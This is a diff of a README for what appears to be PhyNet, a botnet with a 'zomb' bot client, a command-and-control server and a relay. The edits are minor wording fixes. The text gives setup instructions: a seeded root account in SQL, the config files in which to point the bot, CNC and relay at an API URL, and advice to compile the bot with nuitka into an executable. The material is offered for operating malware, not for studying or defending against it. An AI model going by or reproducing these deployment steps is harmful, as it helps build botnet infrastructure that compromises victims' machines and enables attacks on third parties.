@@ -51,8 +51,8 @@ INSERT INTO `users` (`id`, `username`, `password`) VALUES
 (1, 'root', '2b64f2e3f9fee1942af9ff60d40aa5a719db33b8ba8dd4864bb4f11e25ca2bee00907de32a59429602336cac832c8f2eeff5177cc14c864dd116c8bf6ca5d9a9');
 COMMIT;
 ```
-(the password encryption is sha512+sha256)   
-In php you can use this function for generate an password
+(the password encryption is sha512)   
+In php you can use this function for generate a password
 ```php
 function create_acc($usr, $pass) {
 
@@ -91,9 +91,9 @@ if (!$conn) {
 }
 ```
 You have to change your api url in:  
-> the zomb ([CLIENT/zomb.py](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/bot/zomb.py)) `API_URL: str = "http://localhost/phybot/api/v1"` (L28), 
-> the cnc config ([SERVER/cnc.py](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/cnc/modules/config.py)) `api_url="http://localhost/phybot/api/v1"` (L42)
-> and the relay config ([SERVER/relay.py](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/relay/modules/config.py)) `api_url="http://localhost/phybot/api/v1"` (L41)
+> the zomb ([CLIENT/zomb.py](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/bot/zomb.py)) `API_URL: str = "http://localhost/phybot/api/v1"` (L28),  
+> the cnc config ([SERVER/cnc.py](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/cnc/modules/config.py)) `api_url="http://localhost/phybot/api/v1"` (L42),  
+> and the relay config ([SERVER/relay.py](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/relay/modules/config.py)) `api_url="http://localhost/phybot/api/v1"` (L41)  
 
 # ZOMB
 you may want to compile the bot with nuitka (create a fast executable file because the python code is transpiled to c and compiled)
